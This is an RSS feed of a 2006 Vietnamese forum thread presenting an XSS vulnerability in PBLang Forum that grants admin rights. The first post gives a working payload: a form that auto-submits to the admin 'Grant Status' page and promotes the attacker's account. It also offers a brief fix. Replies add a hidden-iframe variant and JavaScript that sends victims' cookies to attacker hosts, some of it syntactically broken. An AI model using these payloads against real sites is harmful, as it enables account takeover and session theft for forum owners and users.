<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "PBLang Forum XSS vuln =&gt; get admin"]]></title>
		<link>/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "PBLang Forum XSS vuln =&gt; get admin"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>PBLang Forum XSS vuln =&amp;gt; get admin</title>
				<description><![CDATA[ /--------------------------------------
Product: PBLang Forum
Version: 4.67.14.a + older
Vuln: XSS
Rate: khá nguy hiểm
Homepage:<span class="link"> http://pblforum.drmartinus.de/</span> (tested)
Author: Quan Vân Trường
--------------------------------------/

<font color='yellow'><b>Sơ lượt:</b></font>
PBLang Forum: viết bằng ngôn ngữ PHP, khá ổn định, đặc biệt: sử dụng file làm DB. Một số "điểm yếu" đã được phát hiện trước đây: XSS, cookie, code injection...
Trong đó, "điểm yếu" chết người nhất là: ko tách ACP ra khỏi main forum => chỉ cần login 1 lần là có thể vào đến ACP. Mặt khác, trong ACP có mục "Grant Status". Ta sẽ sử dụng XSS để submit form "Grant Status" theo ý mình.
XSS dc tìm thấy tại file profile.php

<font color='yellow'><b>Khai thác:</b></font>
Chỉ cần admin của forum vào URL này:
<span class="link"> hxxp://</span><font color='orange'>[path_to_PBLang]</font>/profiles.php?u=
<form name=hack method=post action=http://localhost/PBL/admin2.php?do=grantm2>
<input type=hidden name=user value=<font color='orange'>[username của bạn]</font>><input type=hidden name=stat value=7></form>
<body onload=document.hack.submit()>

Bạn sẽ trở thành admin. Chú ý, tất cả các tag cùng 1 dòng, em phải xuống dòng cho dễ nhìn...

<font color='yellow'><b>Khắc phục:</b></font>
Thực ra PBLang đã fix bug XSS tại mục này, vấn đề phát sinh XSS là do PBLang dùng file để làm DB và để lấy info của 1 user, PBLang phải dùng <b>fopen</b> và <b>include</b> => error có chứa XSS mà ta đã tạo.
Vậy, ta cần vô hiệu hoá các báo lỗi bằng cách thêm "<b>@</b>" vào trước <b>fopen</b> và <b>include</b>, cái này ai đã học qua PHP đều biết, em ko nói thêm.

Thân.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/1385.html#6544</guid>
				<link>/hvaonline/posts/list/1385.html#6544</link>
				<pubDate><![CDATA[Thu, 13 Jul 2006 23:00:49]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>PBLang Forum XSS vuln =&amp;gt; get admin</title>
				<description><![CDATA[ Chà kì này chắc phải viết lại gần hết code của PBLang quá]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/1385.html#9119</guid>
				<link>/hvaonline/posts/list/1385.html#9119</link>
				<pubDate><![CDATA[Sat, 22 Jul 2006 15:07:44]]> GMT</pubDate>
				<author><![CDATA[ xnohat]]></author>
			</item>
			<item>
				<title>PBLang Forum XSS vuln =&amp;gt; get admin</title>
				<description><![CDATA[ Anh có một ý kiên nữa, là để cho khéo thì nên làm như sau
/profiles.php?u=<b><iframe src=_blank withd=1 height=1 name=ihack></iframe></b>
<form name=hack method=post action=http://localhost/PBL/admin2.php?do=grantm2 <b>target=ihack</b>> 
<input type=hidden name=user value=[username của bạn]><input type=hidden name=stat value=7></form> 
<body onload=document.hack.submit()> ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/1385.html#11349</guid>
				<link>/hvaonline/posts/list/1385.html#11349</link>
				<pubDate><![CDATA[Mon, 31 Jul 2006 10:43:12]]> GMT</pubDate>
				<author><![CDATA[ Luke]]></author>
			</item>
			<item>
				<title>PBLang Forum XSS vuln =&amp;gt; get admin</title>
				<description><![CDATA[ Dùng kỹ thuật này để ăn cắp cookie 1 cách hoàn hảo

Nếu chỉ post đơn thuần javascript, thì có thể tạo tương tự như sau

iObj=document.createElement("iframe");
iObj=setAttribute("name","ihack");
iObj.width=1;
iObj.height=1;
iObj.src='http://hacker'sdomain.com/savecookie='+document.cookie()]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/1385.html#11350</guid>
				<link>/hvaonline/posts/list/1385.html#11350</link>
				<pubDate><![CDATA[Mon, 31 Jul 2006 10:50:18]]> GMT</pubDate>
				<author><![CDATA[ Luke]]></author>
			</item>
			<item>
				<title>PBLang Forum XSS vuln =&amp;gt; get admin</title>
				<description><![CDATA[ Thế này thì còn khéo hơn nữa
onmouseover="LukesObj=document.createElement('img'); LukesObj.style.width=1;LukesObj.style.height=1;LukesObj.src= 'http://hackershost.com/log.php?cookie'=document.cookie; document.body.insertBefore(LukesObj);"]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/1385.html#12835</guid>
				<link>/hvaonline/posts/list/1385.html#12835</link>
				<pubDate><![CDATA[Sun, 6 Aug 2006 22:08:38]]> GMT</pubDate>
				<author><![CDATA[ Luke]]></author>
			</item>
	</channel>
</rss>
